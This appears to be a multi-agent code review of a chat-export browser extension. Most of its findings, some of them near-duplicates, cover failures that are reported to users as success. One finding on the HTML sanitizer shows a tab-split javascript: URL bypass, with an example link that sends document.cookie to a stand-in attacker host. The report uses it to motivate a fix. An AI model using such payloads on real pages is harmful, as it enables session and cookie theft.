Source: the 13-dimension senior review of 2026-07-31 (26 agents, findings adversarially reviewed).
**13 findings** in this task: 6 high, 6 medium, 1 low.

This project has an explicit rule that a failure must never be presented as success. These are the
violations. Several are user-facing: a failed print closes the popup as if it worked; context-menu and
keyboard exports drop the content script's failure entirely; a failed preference write leaves the
toggle showing a value that was never saved.

## Findings

### [high] "No conversation available" is reported to the caller as a successful export/print

- **Where:** `src/extension/content/content-script.ts`:146
- **Problem:** When `parseConversation()` returns null, `handleExport` (line 144-147) and `handlePrint` (line 285-289) `return undefined`. The onMessage handler cannot distinguish "no conversation" from "completed with no warning": both are `undefined`, and it replies `sendResponse({ success: true })` (lines 774-785). Nothing was exported, no file was written, yet the reply says the operation succeeded. This is the exact rule the lo-2086 regression file was written to enforce (tests/unit/extension/content/content-script.test.ts lines 4-6: "a failed export ... must be reported to the popup as success: false, not silently swallowed and reported as success") — that file covers the exporter-throws and zero-pairs cases but never the parseConversation()-returns-null case.
- **Failure scenario:** Deterministic via the context menu: on https://claude.ai/recents (or /projects, /new), `isClaudeUrl` matches (src/core/parsers/claude/selectors.ts:109 is `/^https?:\/\/(www\.)?claude\.ai/`) but `CLAUDE_SELECTORS.conversationContainer` is absent, so `canParse()` is false for Claude and for every other parser → `detectParser()` returns null → `parseConversation()` returns null. The context menu is registered for `https://claude.ai/*` (service-worker.ts:239), so the user right-clicks → Export → PDF, and the content script answers `{success:true}`. No download, no error, no badge. Same for Print. The popup path reaches it too whenever the container is re-mounted or the SPA route changes between the popup's initial parse and the export click.
- **Suggested fix:** Throw instead of returning `undefined` in both places, matching the zero-pairs guard 12 lines below (`throw new Error('No conversation pairs found to export')`) — the handler's catch already turns a throw into `{success:false, error}` and the popup already renders it. e.g. `if (!conversation) throw new Error('No conversation could be parsed from this page');` (and in handlePrint, close `printWindow` before throwing, as the existing catch does).
- **Evidence:** content-script.ts:142-147 `let conversation = this.parseConversation();\n\n    if (!conversation) {\n      console.error('[AI Chat Exporter] No conversation available');\n      return undefined;\n    }` → content-script.ts:774-779 `} else if (isExportConversationMessage(message)) {\n        const warning = await contentScript.handleExport(...);\n        sendResponse({ success: true, ...(warning && { warning }) });`

### [high] Service worker ignores the content script's success flag, so context-menu and shortcut export failures are invisible

- **Where:** `src/extension/background/service-worker.ts`:374
- **Problem:** `sendMessageToTab` treats `result.ok` (message *delivered*) as "export succeeded": it returns early without inspecting `result.response.success` or `.error`. Every failure the content script correctly reports as `{success:false, error}` — zero pairs, no exporter for the format, an exporter throw, a blocked print window — is discarded, and the badge is left in the cleared state set at line 372. The function's own docstring (lines 345-353) states the badge exists precisely because "a `console.error` here is a failure the user never sees", so payload failures were meant to reach it. service-worker.test.ts only covers transport failures (injection refused, tab discarded); no test sends back `{success:false}`.
- **Failure scenario:** On https://claude.ai/new (container present, no messages) the user right-clicks → Export → Markdown. The content script throws "No conversation pairs found to export" and replies `{success:false, error:...}`. `sendTabMessage` returns `{ok:true, response:{success:false,...}}`, so `sendMessageToTab` returns at line 376: no badge, no log, no file. Same for the Ctrl+Shift export shortcut (lines 429-457). The user is told nothing at all.
- **Suggested fix:** Inspect the payload as well as the transport: type the call as `sendTabMessage<MessageResponse>(...)` and add `if (result.ok) { const r = result.response; if (r && r.success === false) { console.error(`[${EXTENSION_NAME}] Export failed in tab ${tabId}:`, r.error); setErrorBadge(true); } return; }`.
- **Evidence:** service-worker.ts:374-386 `void sendTabMessage(tabId, message).then((result) => {\n    if (result.ok) {\n      return;\n    }\n    if (result.reason === 'failed') { ... }` — `result.response` is never read; tab-messaging.ts:64 returns `{ ok: true, response: ... }` for any resolved reply, including `{success:false}`.

### [high] Popup closes on a failed print without checking response.success

- **Where:** `src/extension/popup/popup.ts`:1205
- **Problem:** `handlePrint` reads the reply and checks only `response?.warning`, never `response?.success` — unlike `handleExport` 30 lines above, which throws on `!response?.success` (line 1173-1175). `chrome.tabs.sendMessage` resolves normally when the content script replies `{success:false, error}`, so the catch block never runs, and the popup calls `window.close()` (line 1210) on a print that failed. The failure text the content script produced is thrown away.
- **Failure scenario:** The user has pop-ups blocked for claude.ai and clicks Print. `handlePrint` in the content script throws "Could not open the print window. Your browser blocked the popup — allow popups for this site and try again." (content-script.ts:273-277); the handler replies `{success:false, error:<that text>}`. The popup ignores it and closes. The user gets no print dialog and no message, and never learns pop-ups are the cause. Identical outcome for any exporter failure on the print path (`{success:false, error:'Print generation failed'}`). The existing test only covers a *rejected* sendMessage (popup.test.ts:188-190), so this path is uncovered.
- **Suggested fix:** Mirror handleExport: after awaiting the response add `if (!response?.success) { throw new Error(response?.error ?? getMessage('statusPrintFailed')); }` before the warning check, and surface `error.message` in `updateStatus` so the pop-up-blocked text actually reaches the user.
- **Evidence:** popup.ts:1205-1210 `const response: MessageResponse | undefined = await chrome.tabs.sendMessage(tab.id, message);\n      if (response?.warning) { this.showWarning(response.warning); return; }\n      window.close();` vs popup.ts:1172-1175 `if (!response?.success) { throw new Error(response?.error ?? getMessage('statusExportFailed')); }`

### [high] A failed parse is reported to the popup as a successful export

- **Where:** `src/extension/content/content-script.ts`:146
- **Problem:** `handleExport` returns `undefined` (not a throw) when `parseConversation()` returns null, and `handlePrint` does the same at line 288 after closing the print window. The message listener cannot distinguish "completed, not degraded" from "never ran": it responds `{ success: true }` for any `undefined` return (lines 776-779 and 782-785). The popup then treats that as a clean export and calls `window.close()` (popup.ts:1182). The project rule that a failure must never be presented as success is violated at the widest choke point in the codebase — `parseConversation()` returns null for BOTH of the two things the drift system exists to detect: `detectParser()` returning null (Claude and Gemini `canParse()` both require `document.querySelector(selectors.conversationContainer)` to match — claude/parser.ts:125, gemini/parser.ts:30) and `parseResult.success === false` (any throw inside `extractQAPairs`, base-parser.ts:90-95).
- **Failure scenario:** Anthropic or Google renames the conversation-container class (routine DOM drift, the exact thing src/core/drift exists for), or a single malformed turn makes `extractQAPairs` throw, after the popup has already painted the ready state (the popup's own check ran against the pre-drift DOM, or the SPA re-rendered between the check and the click). User clicks Export → `parseConversation()` returns null → `handleExport` returns undefined → listener replies `{success:true}` → popup closes with no error, no warning, no badge, and no file on disk. The only trace is a `console.error` in the page console that no user opens. Same on the context-menu/keyboard path, where nothing checked the page first, so it is the likely outcome rather than a race.
- **Suggested fix:** Make the null-conversation path throw instead of returning undefined: replace `return undefined;` at content-script.ts:146 with `throw new Error('No conversation could be parsed from this page');` (and at :288, after `printWindow.close()`). Both already sit inside callers that convert a throw into `{success:false, error}` (listener catch at :792-797), so the popup's existing error handling picks it up with no other change. Add a regression test asserting `sendResponse` is called with `success:false` when `detectParser()` returns null.
- **Evidence:** content-script.ts:142-147 — `let conversation = this.parseConversation(); if (!conversation) { console.error('[AI Chat Exporter] No conversation available'); return undefined; }` ... listener 774-779 — `} else if (isExportConversationMessage(message)) { const warning = await contentScript.handleExport(...); sendResponse({ success: true, ...(warning && { warning }) }); }` ... popup.ts:1173-1182 — `if (!response?.success) { throw ... } if (response.warning) { ...; return; } window.close();`

### [high] popup handlePrint never checks response.success, so every print failure is silently swallowed

- **Where:** `src/extension/popup/popup.ts`:1205
- **Problem:** `handlePrint` only inspects `response?.warning`; unlike `handleExport` (line 1173), it never checks `response.success` or `response.error`. Any failure the content script correctly reports as `{ success: false, error }` is read as success and the popup closes. The content script's carefully worded, actionable errors are thrown away — including the popup-blocker message at content-script.ts:274-277, which exists precisely to tell the user how to recover.
- **Failure scenario:** User has popups blocked for chatgpt.com (default for many users, and Chrome blocks `window.open` from a content script whose user gesture came from the extension popup in some configurations). User selects PDF, clicks Print → content-script `handlePrint` throws 'Could not open the print window. Your browser blocked the popup — allow popups for this site and try again.' → listener responds `{success:false, error:<that text>}` → popup ignores it and calls `window.close()`. The user sees the popup vanish, no print dialog, and no explanation at all. Identical silent outcome when the exporter itself fails (`result.success` false → 'Print generation failed') or when 0 pairs are parsed ('No conversation pairs found to print').
- **Suggested fix:** Mirror handleExport: after line 1205 insert `if (!response?.success) { throw new Error(response?.error ?? getMessage('statusPrintFailed')); }` before the warning check. The existing catch at 1211-1215 then paints the error state; prefer `error.message` over the generic key there so the popup-blocker instruction actually reaches the user. tests/unit/extension/popup/popup.test.ts:176 covers only the *rejected* promise case, which is why this gap survived.
- **Evidence:** popup.ts:1205-1210 — `const response: MessageResponse | undefined = await chrome.tabs.sendMessage(tab.id, message); if (response?.warning) { this.showWarning(response.warning); return; } window.close();` — no `success` check anywhere in the method, versus popup.ts:1173 `if (!response?.success) { throw new Error(response?.error ?? getMessage('statusExportFailed')); }`

### [high] Context-menu / keyboard exports drop the content script's failure response — no badge, no feedback

- **Where:** `src/extension/background/service-worker.ts`:375
- **Problem:** `sendMessageToTab` treats `result.ok` (message *delivered*) as the export having *worked*. `sendTabMessage` returns `{ok:true, response}` whenever the content script answers at all, including when it answers `{success:false, error:'...'}`. The early `return` at line 376 skips `setErrorBadge(true)`, so a genuinely failed export from the context menu or the keyboard shortcut produces no badge, no notification, and no console error in the worker — the only two surfaces the service worker has (`setErrorBadge`, documented at 345-360 as existing exactly because the worker has no UI) are both bypassed.
- **Failure scenario:** User right-clicks on a chatgpt.com page that has no conversation on it (e.g. the new-chat landing page — a supported URL, so the menu items are shown) and picks Export → PDF. The content script parses 0 pairs, throws 'No conversation pairs found to export', and responds `{success:false, error:...}`. The service worker sees `result.ok === true`, returns at line 376, and clears rather than sets the badge. Nothing at all happens on screen; the user reasonably concludes the extension is broken. Same for any exporter failure (jsPDF chunk fails to load, DOCX packer throws) triggered from the menu or Ctrl+Shift+E.
- **Suggested fix:** Inspect the payload before declaring victory: `void sendTabMessage<MessageResponse>(tabId, message).then((result) => { if (result.ok && result.response?.success) return; ... setErrorBadge(true); })`, logging `result.response?.error` when the delivery succeeded but the operation did not. `MessageResponse` is already importable from '../../shared/messages'.
- **Evidence:** service-worker.ts:371-387 — `void sendTabMessage(tabId, message).then((result) => { if (result.ok) { return; } ... setErrorBadge(true); });` combined with tab-messaging.ts:64 `return { ok: true, response: (await chrome.tabs.sendMessage(tabId, message)) as T };` — `ok:true` says only that a reply arrived.

### [medium] FileReader failures on the print path are unhandled after success was already reported

- **Where:** `src/extension/content/content-script.ts`:340
- **Problem:** Both print branches hand the rest of the work to `reader.onload` and return immediately, so `handlePrint` resolves (→ `{success:true}`, popup closes) before the document is built. Neither branch sets `reader.onerror`, and the md branch's handler is `async` with no `.catch`, so a rejection from `renderMarkdownToCleanHtml` (which dynamically `import()`s marked + highlight.js) becomes an unhandled promise rejection. There is no `unhandledrejection` handler anywhere in src/. The pre-opened window is left showing "Preparing document for printing…" forever.
- **Failure scenario:** The extension is updated or reloaded while a chat tab stays open, invalidating the content script's context. The user clicks Print with format=md: `printWindow` opens and writes "Preparing document for printing…", `handlePrint` returns → popup reports success and closes; then `import('marked')` inside `reader.onload` rejects. Nothing catches it: the new tab sits on the placeholder text, no print dialog appears, and both the popup and the console-free user see a successful print. A `reader.onerror` (unreadable blob) produces the same stuck window in either branch.
- **Suggested fix:** Set `reader.onerror` in both `printBlob` and the md branch to close `printWindow` and report the failure, and wrap the async md handler body in try/catch that does the same (`printWindow.close()`), e.g. `reader.onload = () => { void (async () => { try { ... } catch (e) { printWindow.close(); console.error(e); } })(); }`. Better still, await the FileReader (`await blob.text()`) inside `handlePrint` so a failure propagates through the existing catch and is reported as `success:false`.
- **Evidence:** content-script.ts:339-346 `const reader = new FileReader();\n        reader.onload = async () => {\n          const markdown = reader.result as string;\n          const cleanHtml = await this.renderMarkdownToCleanHtml(...);\n ... };\n        reader.readAsText(result.blob);` — no onerror, no catch; grep for `onerror` across src/ matches only image-loader.ts.

### [medium] An export whose selection resolves to zero pairs succeeds and writes an empty document

- **Where:** `src/extension/content/content-script.ts`:170
- **Problem:** `handleExport`/`handlePrint` guard `conversation.pairs.length === 0` (lines 158, 300) but never guard `pairsToExport.length === 0` after `applySelection` + `getSelectedPairs`. `applySelection` sets `selected: false` on every pair whose `index` is absent from the popup's `selectedIndices`, and pair indices are positional (`pairs.length` at creation, chatgpt/parser.ts:142/161 and equivalents), so a re-parse that yields fewer pairs than the popup saw can drop the whole selection. The exporter then happily produces a header-only file and returns `success:true`, and the popup closes as if the export were complete.
- **Failure scenario:** A long conversation is parsed as 20 pairs when the popup opens; the user opens the pair chooser and keeps only the last three (indices 17, 18, 19). Before the click lands, the page re-renders/unmounts off-screen turns (or a turn is deleted/edited in another window), so the content script's re-parse yields 15 pairs with indices 0–14. `applySelection` marks all 15 unselected, `getSelectedPairs` returns `[]`, and the user gets a Markdown/PDF file containing only the metadata header — reported as a successful export. A partial overlap is worse: the file silently contains different turns than the ones ticked.
- **Suggested fix:** Add the symmetric guard right after computing the selection in both methods: `if (pairsToExport.length === 0) { throw new Error('None of the selected Q&A pairs are still on the page — reload the conversation and try again.'); }`. Optionally have the content script report how many indices it failed to match so the popup can warn instead of silently exporting a different subset.
- **Evidence:** content-script.ts:158-170 `if (conversation.pairs.length === 0) { throw new Error('No conversation pairs found to export'); } ... const pairsToExport = SelectionService.getSelectedPairs(conversation.pairs);` (no length check) and applySelection at lines 44-53; selection-service.ts:38-40 `return pairs.filter((pair) => pair.selected);`

### [medium] Print reports success before rendering starts; errors inside the FileReader callbacks are unhandled

- **Where:** `src/extension/content/content-script.ts`:340
- **Problem:** For `md` (and for txt/json/md via `printBlob`), the actual document generation happens inside a `FileReader.onload` callback that runs *after* `handlePrint` has already returned its success value (line 353). The md callback is an `async` arrow whose promise is never awaited or caught, so a rejection from `renderMarkdownToCleanHtml` is an unhandled rejection that reaches nobody: the try/catch at 354 has already exited, and the popup has already closed. Neither reader has an `onerror` handler. Nothing in `renderMarkdownToCleanHtml` guards the highlighter either — `hljs.highlight`/`highlightAuto` are called raw at 466-468, unlike the guarded `highlightCode` in code-highlight.ts:211-220.
- **Failure scenario:** A conversation contains a code fence that makes highlight.js throw (or the dynamic `import('highlight.js')` fails). User prints as Markdown → the print window opens and shows 'Preparing document for printing…' → `marked.parse` rejects inside the async onload → unhandled rejection, the window is never navigated, never closed, and never prints, while the popup already received `{success:true}` and closed itself. The user is left staring at a permanent 'Preparing document…' tab with no error anywhere.
- **Suggested fix:** Wrap the async work and fail loudly into the already-open window: `reader.onload = () => { void this.renderMarkdownToCleanHtml(...).then(html => this.printBlob(...)).catch(err => { printWindow.document.body.textContent = String(err); }); };` and add `reader.onerror = () => { printWindow.close(); }` to both readers (lines 339-346 and 367-372). Also wrap the `hljs` calls at 466-468 in try/catch returning the escaped source, matching highlightCode's contract.
- **Evidence:** content-script.ts:339-346 — `const reader = new FileReader(); reader.onload = async () => { const markdown = reader.result as string; const cleanHtml = await this.renderMarkdownToCleanHtml(...); ... }; reader.readAsText(result.blob);` followed at 352-353 by `console.log('...Successfully opened...'); return warning;` — success is returned while the render is still pending, and the async callback's rejection has no handler.

### [medium] Print stays enabled with nothing selected and silently produces an empty document

- **Where:** `src/extension/popup/popup.ts`:1122
- **Problem:** `syncExportEnabled` disables the Export button when the user has deselected every pair, but the Print button is governed only by the format gate (`handleFormatChange`, line 630, with the comment at 1156 stating this explicitly), and popup.css greys out only `.split-button`/`.split-toggle` in the `noSelection` state (popup.css:1949-1959) — `.print-button` has no such rule. The content script's emptiness guard checks `conversation.pairs.length` *before* the selection filter is applied (content-script.ts:300, after applySelection at 291), so an empty selection sails past it and the exporter renders a title/metadata-only document, reported as a success.
- **Failure scenario:** User opens the pair chooser, clicks 'Deselect all' (or unticks every pair), returns to the main view — Export is correctly dead, Print is not — and clicks Print. `selectedIndices: []` is sent; `applySelection` marks every pair `selected:false` (an empty array is truthy, so the `!selectedIndices` bypass at content-script.ts:45 does not apply); `getSelectedPairs` returns `[]`; the exporter emits a document containing only the title and metadata header; the print dialog opens on an empty page with no warning that the selection was empty.
- **Suggested fix:** Gate Print on the same condition as Export — have `syncExportEnabled` (or a shared helper) also set `printButton.disabled = !this.pageReady || nothingSelected || !printableFormats.includes(format)`, and add `.popup-body[data-ui-state='noSelection'] .print-button` to the inert-button CSS block. Belt and braces: in content-script.ts check `pairsToExport.length === 0` (not just `conversation.pairs.length === 0`) at lines 158 and 300 and throw, so the context-menu path is covered too.
- **Evidence:** popup.ts:1116-1123 (`syncExportEnabled` touches only `#export-button`) vs popup.ts:624-636 (`printButton.disabled = !canPrint` — format only); content-script.ts:300 `if (conversation.pairs.length === 0) { throw ... }` runs on the parsed pairs, while line 314 `const pairsToExport = SelectionService.getSelectedPairs(finalConversation.pairs);` can still be empty.

### [medium] Preference writes that fail are shown to the user as saved

- **Where:** `src/extension/popup/popup.ts`:560
- **Problem:** `StorageService.setUserPreferences` and `setThemePreference` deliberately re-throw on failure (storage.ts:70 and :106), but every caller in the popup discards the promise with `void` and no `.catch`. The checkbox/radio has already flipped in the DOM (the browser does that, and `applyTheme` is applied optimistically at line 573), so a rejected write leaves the UI asserting a setting that was never persisted — a silent failure presented as success, and an unhandled promise rejection.
- **Failure scenario:** `chrome.storage.sync` rejects — the user is signed out of Chrome sync, sync is disabled by enterprise policy, or MAX_WRITE_OPERATIONS_PER_HOUR / QUOTA_BYTES_PER_ITEM is exceeded (easy to hit with a long `filenamePieces` list plus rapid toggling). User unticks 'Show meta info', sees it unticked, closes the popup, exports — and the export still carries the metadata header because `getUserPreferences` returns the old stored value. Reopening the popup shows the toggle back on, with no error ever displayed.
- **Suggested fix:** Give `persistPreference` a failure path: `private async persistPreference(patch) { try { await StorageService.setUserPreferences(patch); } catch (e) { this.updateStatus('error', getMessage('statusPreferenceSaveFailed')); await this.loadPreferences(); return; } await this.updateOptionsDot(); await this.updateFilenamePreview(); }` (re-reading storage resnaps the toggles to reality), and route line 574's `void StorageService.setThemePreference(theme)` through the same handling.
- **Evidence:** popup.ts:559-561 `void this.persistPreference({ showMetaInfo: (e.target as HTMLInputElement).checked });`, :564 `void this.persistPreference({ fontScale: ... })`, :574 `void StorageService.setThemePreference(theme);` — none has a catch, while storage.ts:68-71 is `} catch (error) { console.error('Failed to save user preferences:', error); throw error; }`.

### [medium] sanitizeHtml's javascript: check is bypassed by a tab or newline inside the scheme

- **Where:** `src/core/utils/sanitize-html.ts`:29
- **Problem:** The URL guard is `/^\s*javascript:/i.test(attr.value)`, which only tolerates whitespace *before* the scheme. Browsers strip tab, LF and CR from anywhere in a URL before parsing the scheme, so `href="java&#9;script:alert(1)"` (a literal tab in the attribute value) is a live javascript: URL that this test does not match and therefore leaves in place. This is the only sanitizer in the codebase, and it is applied at the two documented re-injection points where content scraped off the chat page becomes live DOM (the print document) or markup in an exported file (marked passes raw inline HTML through untouched — the stated reason this function exists).
- **Failure scenario:** A conversation or artifact contains raw inline HTML such as `<a href="java\tscript:fetch('https://evil.example/?c='+document.cookie)">Sources</a>` (attacker-authored shared conversation, pasted content, or prompt-injected output). The user prints it as Markdown: `renderMarkdownToCleanHtml` runs it through marked (which passes the raw anchor through) and `sanitizeHtml` (which does not strip it), then the HTML is loaded into the print window via a blob: URL — which inherits the chat site's origin. Clicking that link in the print preview executes script as claude.ai / chatgpt.com, with access to that origin's cookies and credentialed API calls.
- **Suggested fix:** Normalise before matching and allowlist the scheme rather than blocklisting one: `const url = attr.value.replace(/[ - ]/g, '').toLowerCase(); if (name.startsWith('on') || (isUrlAttr && !/^(https?:|mailto:|#|\/|data:image\/)/.test(url))) node.removeAttribute(attr.name);`. Add the tab-split-scheme string to tests/unit/core/utils/sanitize-html.test.ts alongside the existing plain `javascript:alert(1)` case at line 27, which is the only variant covered today.
- **Evidence:** sanitize-html.ts:26-32 — `const isUrlAttr = name === 'href' || name === 'src'; if (name.startsWith('on') || (isUrlAttr && /^\s*javascript:/i.test(attr.value))) { node.removeAttribute(attr.name); }` — the regex requires the nine characters of `javascript` to be contiguous; `'java\tscript:alert(1)'` fails the test and the attribute survives. Consumers: content-script.ts:683 (print document, blob: URL, origin inherited) and code-highlight.ts:298 (artifact prose in html/pdf/docx exports).

### [low] Preference writes that fail leave the toggle showing a setting that was never saved

- **Where:** `src/extension/popup/popup.ts`:610
- **Problem:** `StorageService.setUserPreferences` rethrows on failure (storage.ts:68-71), but every caller invokes `persistPreference` as `void this.persistPreference(...)` from a DOM event handler. The rejection is an unhandled promise rejection (there is no `unhandledrejection` handler in the extension), the user gets no feedback, and because the failure happens before `updateOptionsDot()`/`updateFilenamePreview()` on the following lines, the popup keeps rendering the new value — the checkbox stays flipped, the filename preview keeps the new pieces — while storage still holds the old one.
- **Failure scenario:** chrome.storage.sync rejects (MAX_WRITE_OPERATIONS_PER_MINUTE is easy to hit from the filename builder, which writes on every chip add/remove/drag and every `change` on a literal field; QUOTA_BYTES_PER_ITEM or a signed-out sync profile do it too). The user turns "Show metadata" off, sees the switch move and the Options dot appear, closes the popup — and the next export still prints the metadata header, because the write was rejected and silently dropped.
- **Suggested fix:** Catch in `persistPreference` and surface it, e.g. `try { await StorageService.setUserPreferences(patch); } catch (e) { this.updateStatus('error', getMessage('statusPreferenceSaveFailed')); throw e; }`, then re-render the control from storage so the UI cannot show an unsaved value. A `window.addEventListener('unhandledrejection', ...)` in the popup would also stop this class of failure from vanishing entirely.
- **Evidence:** popup.ts:607-613 `private async persistPreference(patch) { await StorageService.setUserPreferences(patch); await this.updateOptionsDot(); await this.updateFilenamePreview(); }` called as `void this.persistPreference({ showMetaInfo: (e.target as HTMLInputElement).checked })` (line 560), `void this.persistPreference({ fontScale: ... })` (564), `void this.persistPreference({ filenamePieces: ... })` (900); storage.ts:68-71 rethrows.
